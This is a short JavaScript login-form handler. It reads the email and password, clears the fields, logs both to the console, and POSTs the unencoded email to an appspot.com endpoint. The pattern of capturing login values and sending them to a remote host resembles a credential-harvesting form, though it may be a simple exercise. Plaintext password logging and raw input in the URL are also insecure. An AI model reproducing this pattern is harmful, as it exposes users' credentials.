const email = document.querySelector("#email");
const password = document.querySelector("#password");
const btn = document.querySelector("#btn");


btn.addEventListener("click", async () => {
    let em = email.value;
    let pass = password.value;

    email.value = "";
    password.value = "";

    console.log(em);
    console.log(pass);

    await fetch(`https://mindful-braid-380816.el.r.appspot.com/insert/10/${em}`, {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
    });
})